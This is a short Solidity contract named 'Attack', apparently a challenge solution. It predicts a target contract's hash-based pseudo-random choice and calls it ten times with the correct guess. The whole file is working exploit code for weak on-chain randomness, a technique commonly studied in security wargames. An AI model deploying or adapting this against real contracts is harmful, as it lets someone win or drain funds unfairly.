// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address public target;
    uint8 public steps = 0;

    function setTarget(address _target) public {
        target = _target;
        steps = 0;
    }
    function solve() public {
        require(target != address(0), "Target address is not set");
        for (uint8 i = 0; i < 10; i++) {
            bytes32 hash = keccak256(abi.encodePacked(address(this), steps, target));
            bool choice = uint8(hash[0]) % 2 == 0;
            steps++;
            (bool success, ) = target.call(abi.encodeWithSelector(0xed74d933, choice));
            require(success, "Call failed");
        }
    }
}